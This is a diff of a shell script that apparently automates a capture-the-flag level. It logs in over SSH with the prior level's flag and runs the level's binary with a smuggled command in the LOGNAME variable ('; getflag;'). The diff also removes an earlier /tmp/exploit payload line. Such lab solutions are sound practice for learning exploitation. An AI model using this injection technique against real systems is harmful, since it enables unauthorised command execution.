@@ -109,7 +109,7 @@ main() {
     level07_password=$(cat "$CURR_DIR_PATH/../../level06/flag");
 
     init_ssh_socket "$level07_socket_path" "$host" "$port" "$level07_username" "$level07_password";
-    #ssh_exec_via_socket "$level07_socket_path" "$host" "$port" "$level07_username" "echo '[x \${\`getflag > /tmp/checkflag\`}]' > /tmp/exploit"
+    checkflag=$(ssh_exec_via_socket "$level07_socket_path" "$host" "$port" "$level07_username" "LOGNAME='; getflag;' /home/user/level07/level07" | tail -n 1 | awk '{ print $NF }');
     close_ssh_socket "$level07_socket_path" "$host" "$port" "$level07_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
